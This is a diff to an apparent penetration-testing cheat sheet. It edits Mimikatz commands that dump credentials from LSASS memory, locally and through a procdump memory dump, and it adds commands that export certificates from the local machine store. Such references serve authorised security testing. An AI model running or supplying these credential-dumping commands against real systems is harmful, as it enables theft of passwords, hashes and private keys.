@@ -242,19 +242,26 @@ masscan --readscan massscan-all-tcp-udp
 
 Dumping hashes locally:
 ```
+log logfile1
 privilege::debug
-log
 sekurlsa::logonpasswords
 ```
 
 Dumping hashes remotely:
 ```
-TARGET > procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
+TARGET > 
+procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
 
 LOCAL MIMIKATZ >
 log 
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonPasswords
+```
+
+Extract certificate
+```
+crypto::capi
+crypto::certificates /systemstore:local_machine /export
 ```
 
 # Crackmapexec
